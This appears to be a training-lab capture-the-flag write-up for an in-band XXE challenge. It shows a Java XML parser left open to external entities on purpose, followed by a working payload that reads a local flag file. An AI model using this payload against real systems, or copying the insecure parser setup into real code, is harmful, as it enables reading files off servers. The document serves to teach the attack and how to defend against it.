# Level 1 — In-band XXE File Read

## Challenge Description

This challenge simulates XML configuration parsing. The backend uses `DocumentBuilderFactory` without disabling external entities. Attackers can define external entities to read a virtual flag file.

**Objective**: Craft an XML payload with an external entity to read the virtual file `/flag/xxe-level1` and capture the Flag.

## Vulnerability Analysis

```
POST /api/challenge/xxe/level1/parse
Content-Type: application/xml
```

**Vulnerability**:

```java
// [VULNERABILITY] External entity resolution not disabled
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// No security features set — XXE allowed
DocumentBuilder builder = factory.newDocumentBuilder();
```

**Virtual file**: `/flag/xxe-level1` → Content: `XXE_LEVEL1_SECRET_TOKEN_2024`

## Walkthrough

### Step 1: Submit Normal XML

```xml
<?xml version="1.0"?>
<config>
    <name>test</name>
</config>
```

### Step 2: Craft XXE Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///flag/xxe-level1">
]>
<config>
    <name>&xxe;</name>
</config>
```

### Step 3: Capture the Flag

When the parsed result contains the virtual flag file content, the response includes the Flag.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/xxe/XxeLevel1Controller.java` | Backend XML parsing endpoint |
| `service/FlagService.java` | Flag retrieval and validation |
